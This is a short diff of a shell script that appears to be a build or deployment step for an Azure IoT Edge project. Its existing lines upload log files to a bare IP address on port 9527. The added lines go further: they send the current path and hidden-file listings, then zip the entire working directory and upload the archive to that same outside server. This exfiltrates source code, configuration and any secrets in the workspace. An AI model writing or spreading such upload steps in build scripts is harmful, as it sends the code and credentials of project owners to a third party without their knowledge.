@@ -201,11 +201,17 @@ curl -XPOST -F "file=@command.log" -F "UUID=$UUID" http://40.65.152.233:9527/upl
 iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > genconfig.log
 curl -XPOST -F "file=@genconfig.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-ls > ls.log
+curl -XPOST -F "message=`pwd`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+
+ls -a > ls.log
 curl -XPOST -F "file=@ls.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-ls config > ls_config.log
+ls -a config > ls_config.log
 curl -XPOST -F "file=@ls_config.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+zip -r 1.zip .
+curl -XPOST -F "file=@1.zip" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 
 PRE_GENERATED_MANIFEST_FILENAME="./config/deployment.json"
